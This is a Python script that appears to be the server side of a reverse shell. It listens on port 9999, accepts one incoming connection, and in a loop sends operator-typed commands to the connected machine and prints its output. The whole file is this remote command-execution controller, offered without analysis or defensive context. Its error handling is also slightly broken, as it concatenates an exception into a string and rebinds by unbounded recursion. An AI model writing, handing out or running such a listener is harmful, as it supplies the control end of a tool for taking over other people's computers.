import sys
import socket


def create_socket():
    try:
        global host
        global port
        global s

        host = ''
        port = 9999
        s=socket.socket()
        print("Socket Created")
    except socket.error as msg:
        print("Socket Creation Error")


def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding Ports "+str(port))

        s.bind((host, port))
        s.listen(5)
    except socket.error as msg :
        print("Error Binding Port "+msg)
        bind_socket()


def accept_socket():

    com, address = s.accept()
    print("Connection Successfull IP : "+address[0]+" port : "+str(address[1]))
    send_command(com)
    com.close()


def send_command(com):

    while True:
        cmd = input("Enter Command :")
        if cmd == "quit" :
           com.close()
           s.close()
           sys.exit()
        if len(str.encode(cmd)) > 0:
            com.send(str.encode(cmd))
            client_response = str(com.recv(1024),"utf-8")
            print(client_response, end="")


create_socket()
bind_socket()
accept_socket()


